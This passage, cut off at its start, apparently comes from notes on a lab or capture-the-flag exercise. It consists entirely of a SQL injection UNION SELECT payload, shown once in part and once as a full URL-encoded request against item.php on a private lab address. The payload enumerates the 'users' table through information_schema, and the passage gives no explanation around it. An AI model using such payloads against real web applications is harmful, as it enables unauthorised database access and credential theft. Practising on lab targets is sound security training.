= database() and table_name = "users";  
  
  
  
[http://10.10.103.194/item.php?id=5%20UNION%20SELECT%201,%202,3%20,4,%20group_concat(table_name)%20FROM%20information_schema.columns%20WHERE%20table_schema%20=%20database()%20and%20table_name%20=%20%22users%22;](http://10.10.103.194/item.php?id=5%20UNION%20SELECT%201,%202,3%20,4,%20group_concat(table_name)%20FROM%20information_schema.columns%20WHERE%20table_schema%20=%20database()%20and%20table_name%20=%20%22users%22;)